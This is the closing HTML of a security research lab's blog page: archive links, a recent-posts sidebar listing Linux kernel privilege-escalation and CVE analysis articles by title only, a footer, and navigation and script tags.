href="archives/2017/10/">十月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
          </li>
        
          <li>
            <a href="2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
          </li>
        
          <li>
            <a href="2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
          </li>
        
          <li>
            <a href="2022/07/04/CVE-2022-23222/">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
          </li>
        
          <li>
            <a href="2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2025 IceSword Lab<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="index.html" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/research" class="mobile-nav-link">Research</a>
  
    <a href="/vulnerabilities" class="mobile-nav-link">Vulnerabilities</a>
  
    <a href="/recruitment" class="mobile-nav-link">Recruitment</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="fancybox/jquery.fancybox.css">

  
<script src="fancybox/jquery.fancybox.pack.js"></script>




<script src="js/script.js"></script>




  </div>
</body>
</html>